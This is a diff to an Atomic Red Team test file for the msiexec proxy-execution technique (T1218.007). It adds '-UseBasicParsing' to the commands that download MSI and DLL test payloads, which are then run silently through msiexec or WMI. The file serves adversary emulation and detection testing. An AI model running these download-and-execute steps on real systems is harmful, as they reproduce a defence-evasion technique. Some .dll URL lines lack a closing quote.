@@ -29,7 +29,7 @@ atomic_tests:
       if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi" -OutFile "#{msi_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi" -OutFile "#{msi_payload}" -UseBasicParsing
   executor:
     command: |
       #{msi_exe} /q /#{action} "#{msi_payload}"
@@ -62,7 +62,7 @@ atomic_tests:
       if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi" -OutFile "#{msi_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi" -OutFile "#{msi_payload}" -UseBasicParsing
   executor:
     command: |
       #{msi_exe} /q /#{action} "#{msi_payload}"
@@ -95,7 +95,7 @@ atomic_tests:
       if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi" -OutFile "#{msi_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi" -OutFile "#{msi_payload}" -UseBasicParsing
   executor:
     command: |
       #{msi_exe} /q /#{action} "#{msi_payload}"
@@ -128,7 +128,7 @@ atomic_tests:
       if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi" -OutFile "#{msi_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi" -OutFile "#{msi_payload}" -UseBasicParsing
   executor:
     command: |
       #{msi_exe} /q /#{action} "#{msi_payload}"
@@ -157,7 +157,7 @@ atomic_tests:
       if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi" -OutFile "#{msi_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi" -OutFile "#{msi_payload}" -UseBasicParsing
   executor:
     command: |
       Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
@@ -186,7 +186,7 @@ atomic_tests:
       if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi" -OutFile "#{msi_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi" -OutFile "#{msi_payload}" -UseBasicParsing
   executor:
     command: |
       Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
@@ -215,7 +215,7 @@ atomic_tests:
       if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi" -OutFile "#{msi_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi" -OutFile "#{msi_payload}" -UseBasicParsing
   executor:
     command: |
       Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
@@ -244,7 +244,7 @@ atomic_tests:
       if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi" -OutFile "#{msi_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi" -OutFile "#{msi_payload}" -UseBasicParsing
   executor:
     command: |
       Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
@@ -272,7 +272,7 @@ atomic_tests:
       if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile "#{dll_payload}" -UseBasicParsing
   executor:
     command: |
       #{msi_exe} /y "#{dll_payload}"
@@ -300,7 +300,7 @@ atomic_tests:
       if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile "#{dll_payload}" -UseBasicParsing
   executor:
     command: |
       #{msi_exe} /z "#{dll_payload}"
